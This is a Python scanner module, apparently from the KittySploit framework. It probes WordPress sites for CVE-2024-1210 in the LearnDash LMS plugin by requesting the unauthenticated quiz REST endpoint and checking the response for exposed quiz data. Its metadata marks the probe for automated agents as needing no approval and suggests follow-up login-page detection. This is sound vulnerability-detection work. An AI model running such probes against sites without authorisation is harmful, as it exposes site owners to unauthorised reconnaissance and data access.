#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The LearnDash LMS plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LearnDash LMS < 4.10.2 - Sensitive Information Exposure Detection',
        'description': 'The LearnDash LMS plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 4.10.1 via API. This makes it possible for unauthenticated attackers to obtain access to quizzes.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'wpscan', 'cve2024', 'wp', 'wp-plugin', 'wordpress', 'exposure', 'learndash', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/f4b12179-3112-465a-97e1-314721f7fe3d/',
            'https://github.com/karlemilnikka/CVE-2024-1208-and-CVE-2024-1210',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-1210',
            'https://www.learndash.com/release-notes/',
            'https://www.wordfence.com/threat-intel/vulnerabilities/id/61ca5ab6-5fe9-4313-9b0d-8736663d0e89?source=cve',
        ],
        'cve': 'CVE-2024-1210',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-json/ldlms/v1/sfwd-quiz', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"id":', '"quiz_materials":', 'quizzes',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="LearnDash LMS < 4.10.2 - Sensitive Information Exposure detected",
                path='/wp-json/ldlms/v1/sfwd-quiz',
            )
            return True
        return False

